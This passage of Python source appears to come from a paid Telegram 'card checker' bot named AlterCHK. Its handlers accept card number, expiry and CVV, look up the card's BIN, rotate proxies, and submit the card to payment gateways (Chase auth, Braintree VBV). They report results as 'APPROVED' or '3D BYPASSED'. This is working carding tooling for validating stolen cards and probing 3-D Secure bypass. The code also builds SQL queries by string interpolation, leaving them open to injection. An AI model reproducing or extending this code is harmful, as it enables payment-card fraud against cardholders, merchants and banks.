    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDph import ChaseAuth
        CheckRecive = await ChaseAuth(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["vbv"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Braintree [ VBV ]'
    TwoNameGateway = 'Gateway ↯ Braintree [ VBV ]'
    ThreeGateway = 'Gateway 🔥 Braintree [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('vbv')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDvbv import VBV
        CheckRecive = await VBV(CcVerify, CheckedP[1])
        if (CheckRecive == 'Lookup Not Enrolled') or (int(CheckRecive.find('Successful')) >= 0) :
            Status = '[ 3D BYPASSED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ NO BYPASSED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["br"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Zarek [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Zarek [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Zarek [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('br')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
